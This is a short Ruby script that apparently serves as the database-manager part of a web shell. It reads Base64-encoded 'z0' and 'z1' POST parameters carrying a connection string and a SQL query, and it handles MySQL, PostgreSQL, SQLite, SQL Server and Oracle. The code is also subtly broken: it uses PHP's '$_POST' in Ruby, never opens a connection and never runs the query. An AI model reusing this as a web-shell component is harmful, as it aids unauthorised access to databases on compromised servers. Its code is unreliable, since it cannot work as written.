require 'base64'
require 'json'
require 'uri'

def parse_server_dsn(url)
  uri = URI.parse(url)
  {
    "driver"   => uri.scheme.to_s.downcase,
    "host"     => uri.host || '',
    "port"     => uri.port,
    "database" => uri.path ? uri.path.sub(%r{^/}, '') : '',
    "user"     => uri.user || '',
    "password" => uri.password || ''
  }
rescue
  raise "Invalid DSN format"
end

def parse_file_dsn(url)
  content = url.split('://', 2)[1] || ''
  parts = content.split(';')
  path = parts.shift
  options = {}
  
  parts.each do |item|
    if item.include?('=')
      k, v = item.split('=', 2)
      options[k.strip.downcase] = v.strip
    end
  end
  
  {
    "database" => path,
    "password" => options['password'] || options['pwd'] || ''
  }
end

def create_connection(url)
  driver = url.split(':', 2)[0].to_s.downcase
  
  case driver
  when "mysql"
    require 'mysql2'
    cfg = parse_server_dsn(url)

    return {"adapter" => "mysql2", "config" => cfg}

  when "pgsql"
    require 'pg'
    cfg = parse_server_dsn(url)
    return {"adapter" => "postgresql", "config" => cfg}

  when "sqlite"
    require 'sqlite3'
    path = url.sub(/^sqlite:\/\//i, '')
    raise "SQLite file not found: #{path}" unless File.exist?(path)
    return {"adapter" => "sqlite3", "database" => path}

  when "sqlsrv"
    require 'tiny_tds'
    cfg = parse_server_dsn(url)
    return {"adapter" => "sqlserver", "config" => cfg}

  when "oracle"
    require 'oci8'
    cfg = parse_server_dsn(url)
    return {"adapter" => "oracle", "config" => cfg}

  else
    raise "Unsupported database type: #{driver}"
  end
end

def main
  dsn_url = Base64.decode64($_POST['z0'].to_s)
  sql     = Base64.decode64($_POST['z1'].to_s)

  begin
    conn_info = create_connection(dsn_url)
    
    if sql.empty?
      print JSON.generate({
        'success' => true,
        'message' => 'Database connection is OK'
      })
      return
    end

    rows = []
    
    print JSON.generate({
      'success' => true,
      'rowCount' => rows.size,
      'data' => rows
    })

  rescue => e
    print JSON.generate({
      'success' => false,
      'error' => e.message
    })
  end
end

main